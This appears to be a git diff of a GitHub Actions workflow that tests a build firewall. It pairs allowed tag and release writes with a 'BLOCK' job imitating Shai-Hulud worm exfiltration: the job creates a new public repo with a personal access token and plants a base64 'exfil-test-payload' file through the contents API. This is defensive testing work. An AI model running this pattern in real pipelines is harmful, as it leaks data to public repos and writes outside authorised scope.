@@ -1,78 +1,78 @@
-name: Release Patterns (BAF test)
+name: BAF Test - Allow vs Block
 
-# Two common triggers:
-#  - push a tag like v1.2.3  -> release jobs run automatically
-#  - manual run              -> for on-demand testing
+# Manual trigger so you control when it runs and what version/repo names are used.
 on:
-  push:
-    tags:
-      - "v*"
   workflow_dispatch:
     inputs:
       version:
-        description: "Tag to create (e.g. v1.2.3)"
+        description: "Tag/release version (e.g. v1.2.3)"
         required: true
         default: "v0.1.0"
+      new_repo_name:
+        description: "Name for the out-of-scope repo to create"
+        required: true
+        default: "baf-test-repo"
 
 permissions:
-  contents: write   # needed to push tags and create releases
+  contents: write   # lets the built-in GITHUB_TOKEN push tags / create releases in THIS repo
 
 jobs:
-  # ── Variant 1: Push a git tag ─────────────────────────────
-  # git PUSH -> POST .../<repo>.git/git-receive-pack
-  push-tag:
-    if: github.event_name == 'workflow_dispatch'
+  # ══════════════════════════════════════════════════════════
+  #  LEGITIMATE — in-scope writes to the build's OWN repo
+  #  Expected result: ALLOWED
+  # ══════════════════════════════════════════════════════════
+  allow-tag-and-release:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
+
       - name: Configure git identity
         run: |
           git config user.name  "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-      - name: Create and push tag
+
+      # git PUSH -> POST .../<repo>.git/git-receive-pack   (in-scope)
+      - name: "[ALLOW] Push git tag"
         run: |
           git tag -a "${{ github.event.inputs.version }}" -m "Release ${{ github.event.inputs.version }}"
           git push origin "${{ github.event.inputs.version }}"
 
-  # ── Variant 2: Create a Release with the gh CLI ───────────
-  # REST write -> POST api.github.com/repos/{owner}/{repo}/releases
-  release-gh-cli:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Create release (gh CLI)
+      # REST write -> POST api.github.com/repos/{owner}/{repo}/releases   (in-scope)
+      - name: "[ALLOW] Create release in own repo"
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          gh release create "${{ github.ref_name }}" \
-            --title "Release ${{ github.ref_name }}" \
+          gh release create "${{ github.event.inputs.version }}" \
+            --title "Release ${{ github.event.inputs.version }}" \
             --notes "Automated release"
 
-  # ── Variant 3: Create a Release with the standard action ──
-  # REST write -> POST api.github.com/repos/{owner}/{repo}/releases
-  release-action:
+  # ══════════════════════════════════════════════════════════
+  #  MALICIOUS PATTERN — out-of-scope writes to a NEW repo
+  #  Expected result: BLOCKED   (Shai-Hulud / s1ngularity behavior)
+  #  Requires a PAT with 'repo' scope stored as secret GH_PAT.
+  # ══════════════════════════════════════════════════════════
+  block-create-repo-and-plant:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Create release (softprops action)
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: ${{ github.ref_name }}
-          name: "Release ${{ github.ref_name }}"
-          generate_release_notes: true
+      # REST write -> POST api.github.com/user/repos   (out-of-scope)
+      - name: "[BLOCK] Create a brand-new repo"
+        env:
+          GH_TOKEN: ${{ secrets.GH_PAT }}
+        run: |
+          gh api --method POST /user/repos \
+            -f name="${{ github.event.inputs.new_repo_name }}" \
+            -F private=false
 
-  # ── Variant 4: Release + upload a build artifact ──────────
-  # REST write -> POST release, then POST upload asset to that release
-  release-with-asset:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Build artifact
-        run: echo "hello" > app.txt
-      - name: Create release and upload asset
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: ${{ github.ref_name }}
-          files: app.txt
+      # REST write -> PUT api.github.com/repos/{owner}/{repo}/contents/{path}
+      # (same endpoint Shai-Hulud used to plant discussion.yaml)   (out-of-scope)
+      - name: "[BLOCK] Plant a file in the new repo"
+        env:
+          GH_TOKEN: ${{ secrets.GH_PAT }}
+        run: |
+          OWNER=$(gh api /user --jq .login)
+          gh api --method PUT \
+            "/repos/$OWNER/${{ github.event.inputs.new_repo_name }}/contents/data.json" \
+            -f message="init" \
+            -f content="$(echo -n 'exfil-test-payload' | base64)"
